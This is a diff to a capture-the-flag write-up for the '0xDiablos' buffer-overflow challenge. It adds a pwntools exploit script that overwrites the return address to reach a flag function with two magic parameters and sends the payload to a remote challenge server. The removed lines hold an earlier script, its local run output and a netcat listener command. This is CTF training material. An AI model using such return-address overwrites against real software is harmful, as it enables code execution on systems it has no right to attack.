@@ -178,70 +178,28 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 It's time to play with python, after some research I found python [pwntools](http://docs.pwntools.com/en/latest/). Let's try to run our first python pwn script.
+In order to work on server side, we need offset, flag ebp addres, and two parameters  from fu nfunction flag, on ghidra we can get the adresses of both 0xdeadbeef and 0xc0ded00d:
+![ghidra parms](IMG/ghidra_parms.jpg)
+
+
 First run against the vuln file:
 ```python
 from pwn import *
-context(arch = 'i386', os = 'linux')
 
-SERVER = "46.101.53.80"
-PORT = 31815
-#exploit = 'A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0'
 offset = b"A" * 188
-ebpfalg = b"\xe2\x91\x04\x08"
-exploit = offset + ebpfalg
-elf = ELF("./vuln")
-print(exploit)
+fourbytes = b"AAAA"
+flag_ebp = p32(0x080491e2, endian="little")
+parm_one = p32(0xdeadbeef, endian="little")
+parm_two = p32(0xc0ded00d, endian="little")
+serverip = "178.62.13.127"
+port = 30495
 
-r = elf.process()
-#r = remote(SERVER, PORT)
-# EXPLOIT CODE GOES HERE
-print(exploit)
-r.sendafter(":", exploit)
-r.interactive()
-```
+exploit = offset + flag_ebp + fourbytes + parm_one + parm_two
 
-Seems works fine against vuln file, output:
-
-```shell
-python exploit.py 
-[*] '/home/darthv/git/badorius/vulnhub/0xDiablos/FootHold/vuln'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x91\x04\x08'
-[+] Starting local process '/home/darthv/git/badorius/vulnhub/0xDiablos/FootHold/vuln': pid 15727
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x91\x04\x08'
-/home/darthv/git/badorius/venv/lib/python3.10/site-packages/pwnlib/tubes/tube.py:812: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  res = self.recvuntil(delim, timeout=timeout)
-[*] Switching to interactive mode
- 
-$ 
-[*] Process '/home/darthv/git/badorius/vulnhub/0xDiablos/FootHold/vuln' stopped with exit code 0 (pid 15727)
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x9
-Hurry up and try in on server side.
-[*] Got EOF while reading in interactive
-$ 
-[*] Got EOF while sending in interactive
-Traceback (most recent call last):
-  File "/home/darthv/git/badorius/venv/lib/python3.10/site-packages/pwnlib/tubes/process.py", line 746, in close
-    fd.close()
-BrokenPipeError: [Errno 32] Broken pipe
-```
-
-But It doesn't work against server side. It's time to read more about buffer overflow, and CTF framework pwn. Recomended read [Hacking the art of explotation](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf)
-
-Practice with local netcat, open netcat port with vuln file:
-```shell
-└─$ sudo ./vuln |nc -nlvp 1234
-listening on [any] 1234 ...
-```
-
-Send data to localhost:
-```shell
-
+server = remote(serverip, port)
+#server = elf.process()
+server.sendlineafter(":", exploit)
+server.interactive()
 ```
 
 
